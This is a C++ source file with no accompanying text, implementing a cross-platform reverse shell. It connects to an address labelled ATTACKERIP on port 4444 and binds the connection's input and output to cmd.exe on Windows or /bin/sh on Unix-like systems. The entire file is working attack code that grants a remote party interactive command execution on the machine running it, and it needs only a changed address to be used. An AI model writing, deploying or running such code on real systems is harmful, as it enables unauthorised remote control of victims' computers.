#include <iostream>
#include <cstring>

#if defined(_WIN32) || defined(WIN32)
    #include <winsock2.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib")
    #define CLOSESOCKET closesocket
    typedef SOCKET SOCKETTYPE;
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #define CLOSESOCKET close
    typedef int SOCKETTYPE;
#endif

const char* ATTACKERIP = "127.0.0.1";
const int ATTACKERPORT = 4444;

int main() {
#if defined(_WIN32) || defined(WIN32)
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    SOCKETTYPE s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return 1;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(ATTACKERPORT);
    addr.sin_addr.s_addr = inet_addr(ATTACKERIP);

    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        WSACleanup();
        return 1;
    }

    std::cout << "Connected to " << ATTACKERIP << ":" << ATTACKERPORT << std::endl;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError = (HANDLE)s;

    char cmd[] = "cmd.exe";
    if (CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
#else
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return 1;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(ATTACKERPORT);
    addr.sin_addr.s_addr = inet_addr(ATTACKERIP);

    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) return 1;

    std::cout << "Connected to " << ATTACKERIP << ":" << ATTACKERPORT << std::endl;

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execl("/bin/sh", "sh", (char*)NULL);
#endif

    CLOSESOCKET(s);
#if defined(_WIN32) || defined(WIN32)
    WSACleanup();
#endif
    return 0;
}
